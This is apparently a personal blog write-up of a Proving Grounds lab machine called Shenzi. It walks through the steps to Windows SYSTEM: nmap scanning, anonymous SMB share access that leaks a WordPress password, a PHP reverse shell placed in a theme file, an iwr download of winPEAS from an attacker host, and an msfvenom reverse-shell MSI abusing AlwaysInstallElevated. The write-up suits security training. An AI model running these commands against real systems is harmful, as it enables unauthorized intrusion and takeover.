---
title: Shenzi PGP walkthrough
description: Target - Shenzi, OS - Windows
date: 2025-16-12
readTime: 10 min read
image: ../assets/images/Shenzi/Xampp-dashboard.png
---

# *Enum*

Gather information about the target  network, systems, services, open ports with nmap

```
nmap -sVC -n -T4 --open -Pn -oN Shenzi-nmap 192.168.201.55

Nmap scan report for 192.168.201.55
Host is up (0.33s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.201.55/dashboard/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.201.55/dashboard/
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -25s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-19T15:18:10
|_  start_date: N/A

```

`/dashboard/`  has the default XAMPP page with backend language as PHP in use. That is a good point to be noted. We might craft a PHP based reverse shell.

![XAMPP](/1dragon/assets/images/Shenzi/Xampp-dashboard.png)

`php-info` Looking for `document-root`  the path was set `C:xampp/htdocs/`  which is the root directory for the web application being hosted. 

Note: The php-info page usually should not be kept accessible for public. 

![docrt](/1dragon/assets/images/Shenzi/doc-root.png)

---
# *Initial Access*

Nmap scan results revealed that SMB port is open  
```
smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Tried to log-in with no creds using the `-N` parameter in smbclient. First tried listing the available shares. Found a shared named `Shenzi`

```
 smbclient  -L \\\\192.168.201.55\\ -N                               

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        Shenzi          Disk      
Reconnecting with SMB1 for workgroup listing.

```

Further listed the Shenzi shared and found some files in which the `passwords.txt` looked interesting and a valuable lead.

```
└─$ smbclient  \\\\192.168.201.55\\shenzi -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 28 08:45:09 2020
  ..                                  D        0  Thu May 28 08:45:09 2020
  passwords.txt                       A      894  Thu May 28 08:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 08:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 08:45:09 2020
  why.tmp                             A      213  Thu May 28 08:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 08:45:09 2020

                12941823 blocks of size 4096. 6420014 blocks available
smb: \> 

```

After downloading all the files form the share viewed the passwords.txt file contents.

```
└─$ cat creds                          
wpadmin - FeltHeadwallWight357
```

The credentials discovered implied there maybe a `Wordpress` site in use. That's another lead now. Fuzzing, sub-domain fuzzing didn't reveal any interesting pages, directory.

Tried to access the website with `/shenzi` to see if such web page exist and it actually turns out to be the Wordpress site being hosted.

The idea about what if a wordpress site is in just named as `Shenzi` actually comes from the lead that the earlier discovered open SMB shared was named as `Shenzi` hence, why not should it be the name of a page too.

![Shenzi-wp](/1dragon/assets/images/Shenzi/Shenzi-wp-site.png)

As we have discovered that Wordpress is in use there must be the admin login page which we tried to login with the discovered passwords from the SMB share as the creds belongs to wp-admin. After trying to use the passwords the user name is `admin` is what worked with the discovered password.

![wpadmin](/1dragon/assets/images/Shenzi/wp-admin.png)

After loggin in as WP site's admin user and going through the pages under Themes > Appearance there are the actual pages like the index.php, 404.php. 

We discovered earlier that the site uses PHP for backend. Tried to modify the contents of index.php with a php based reverse shell and loaded that.

![Theme](/1dragon/assets/images/Shenzi/Themes-page.png)
Since we modified the index.php (Main Index Template) page which contains our reverse shell code accessing the page actually loaded the php reverse shell which is a good sign.

![Shenzi-wp](/1dragon/assets/images/Shenzi/Rev-shell-call.png)

We have a netcat  listener running at local port.

```
rlwrp nc -lnvp 4444
```

use rlwrap for arrow keys funtcionality.

![Shenzi-shell](/1dragon/assets/images/Shenzi/shenzi-shell.png)

Got the reverse shell connected  as Shenzi user

Executed `whoami, whoami /priv` the  current user is Shenzi and no interesting privileges were found.

Got the local flag at  `C:/Users/Shenzi/Desktop/local.txt`

![Local](/1dragon/assets/images/Shenzi/local.png)

---
# *Privilege Escalation*

Further transferred Winpeas  to target using iwr command to enumerate internally. 
```
iwr -uri http://192.168.45.179/wp.exe -o wp.exe

```

![Transtools](/1dragon/assets/images/Shenzi/trans-tools.png)

Renamed winpeas.exe as wp.exe

After executing winpeas analyzed the discovered information and the interesting thing is `AlwaysInstallElevated` has been set to 1 that means we might be able to craft a malicious .msi file and execute it get another shell as NT System user .

![](/1dragon/assets/images/Shenzi/Winpeas.png)

Created a msi file with msfvenom which is a reverse shell that connects back to local as system user / NT.

```
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi rev.msi
```

Transferred the .msi file to the target system and executed that.

![Shenzi-wp](/1dragon/assets/images/Shenzi/msi-exec.png)

Having a netcat listener listening at 4444 at local. Got the shell connected as NT-AUTHORITY\SYSTEM

![](/1dragon/assets/images/Shenzi/NT.png)

Got the proof.txt under 

![](/1dragon/assets/images/Shenzi/proof.png)

---

										Target compromised - |^| ^ ( |< 3 D

